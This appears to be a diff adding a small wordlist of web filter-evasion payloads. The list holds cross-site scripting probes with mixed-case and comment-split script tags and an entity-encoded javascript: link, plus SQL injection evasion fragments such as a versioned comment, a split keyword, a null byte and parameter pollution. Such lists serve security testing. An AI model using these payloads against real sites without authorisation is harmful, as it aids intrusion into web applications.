@@ -1,0 +1,8 @@
+<ScrIpT>confirm()</sCRiPt>
+<!--><script>confirm/**/()/**/</script>
+%00
+/*!SELECT*/
+?id=1&id=2
+SEL<ECT>
+<a href=j&#97v&#97script&#x3A;&#97lert(1)>
+<script>+-+-1-+-+alert(1)</script>
